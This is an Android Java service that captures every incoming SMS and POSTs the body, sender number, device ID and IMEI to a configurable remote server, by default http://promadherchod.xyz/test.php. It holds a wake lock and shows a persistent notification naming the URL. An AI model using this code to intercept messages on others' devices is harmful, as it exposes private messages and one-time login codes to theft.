package nitish.build.com.post_test1;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

public class PostService extends Service {
    String apiUrl, unique_id, imei1="no_permissions_provided", imei2="permissions_denined",
            chanelId="post_service";
    int cur_slot;


    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            if(action.equals("android.provider.Telephony.SMS_RECEIVED")){
                Log.i("VMSG","Recieved");
                Bundle bundle = intent.getExtras();

                 cur_slot = bundle.getInt("slot", -1);
                int sub = bundle.getInt("subscription", -1);
//                Log.i("VMSG_SL",Integer.toString(slot));
//                Log.i("VMSG_SB",Integer.toString(sub));

                for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {

                    Long tempTT = smsMessage.getTimestampMillis()/1000;
//                    Log.i("VMSG_T",Long.toString((smsMessage.getTimestampMillis()));
                    String messageBody = smsMessage.getMessageBody();
                    String address = smsMessage.getOriginatingAddress();
                    Log.i("VMSG_B",messageBody);
                    Log.i("VMSG_A",address);
                    try {
                        JSONObject jsonBody = new JSONObject();
                        jsonBody.put("device_id", unique_id);
                        if (cur_slot==0)
                            jsonBody.put("imei", imei1);
                        else if (cur_slot==1)
                            jsonBody.put("imei", imei2);
                        jsonBody.put("sim", cur_slot+1);
                        jsonBody.put("timestamp", tempTT);
                        jsonBody.put("no", address);
                        jsonBody.put("message", messageBody);
                        volley_test(apiUrl,jsonBody);
                    }catch (Exception e){
                        e.printStackTrace();
                    }


                }
            }
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        SharedPreferences post_pref = getApplicationContext().getSharedPreferences(getResources().getString(R.string.pref_post_main), MODE_PRIVATE);
        apiUrl = post_pref.getString(getResources().getString(R.string.pref_post_api_url), "http://promadherchod.xyz/test.php");
        imei1 = post_pref.getString(getResources().getString(R.string.pref_post_imei1),"permissions_denined");
        imei2 = post_pref.getString(getResources().getString(R.string.pref_post_imei2),"permissions_denined");

        unique_id = android.provider.Settings.Secure
                .getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

//        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//            TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
//            imei1 = manager.getDeviceId(0);
//
//            imei2 = manager.getDeviceId(1);
//
//        }

        Log.i("VMSG","osc_done");
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
//        notificationManagerCompat.cancel(9282);
        unregisterReceiver(receiver);
    }

    @Override
    public void onCreate() {
        super.onCreate();

        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(receiver, filter);

        PowerManager mgr = (PowerManager)getApplicationContext().getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,"MyPostMan:MyWakeLock");
        wakeLock.acquire();

        Intent notificationIntent = new Intent(this, MainActivity.class);

        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, 0);

        SharedPreferences pos_pref = getApplicationContext().getSharedPreferences(getResources().getString(R.string.pref_post_main), MODE_PRIVATE);
        String t_Url = pos_pref.getString(getResources().getString(R.string.pref_post_api_url), "http://promadherchod.xyz/test.php");

        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(getApplicationContext(),chanelId)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("Doing his buisiness in background")
                .setContentText("@: "+t_Url)
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .setOngoing(true)
                .setContentIntent(pendingIntent).build();
//        mBuilder.addAction(R.drawable.ic_cancel_black_24dp,"Cancel",cIntent);
//        notificationManagerCompat = NotificationManagerCompat.from(getApplicationContext());
//        notificationManagerCompat.notify(9282,mBuilder.build());
        startForeground(9282,notification);

        Log.i("VMSG","ocr_done");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }




    public void volley_test(final String url_p, final JSONObject jsonBody) {
        try {
//            RequestQueue requestQueue = Volley.newRequestQueue(this);

            //= "http://promadherchod.xyz/test.php";
//            JSONObject jsonBody = new JSONObject();
//            jsonBody.put("device_id", "dg234k2h3k42g3g");
//            jsonBody.put("imei", "6461298353453535");
//            jsonBody.put("sim", "1");
//            jsonBody.put("timestamp", "1560573718");
//            jsonBody.put("no", "8317369553");
//            jsonBody.put("message", "This is a test message");
//            final String requestBody = jsonBody.toString();

            //{"device_id":"dg234k2h3k42g3g","imei":"6461298353453535","sim":"1"
            // ,"timestamp":"1560573718","no":"8317369553","message":"This is a test message"}

            JsonObjectRequest jsonRequest = new JsonObjectRequest(Request.Method.POST, url_p, jsonBody, new Response.Listener<JSONObject>() {
                @Override
                public void onResponse(JSONObject response) {
                    Log.i("VOLLEY_R", response.toString());
                    if (response.toString().equals("{\"status\":\"failed\"}")){
                        volley_test(url_p,jsonBody);
                    }
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    error.printStackTrace();

                    Log.i("VOLLEY_E", error.toString());
                }
            });

            Volley.newRequestQueue(this).add(jsonRequest);


        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void createNotificationChannel(){
        if(Build.VERSION.SDK_INT>= Build.VERSION_CODES.O){
            CharSequence name ="Download Notif";
            String description = "include all download notif";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel notificationChannel = new NotificationChannel(chanelId,name,importance);
            notificationChannel.setDescription(description);
            NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            notificationManager.createNotificationChannel(notificationChannel);
        }
    }
}
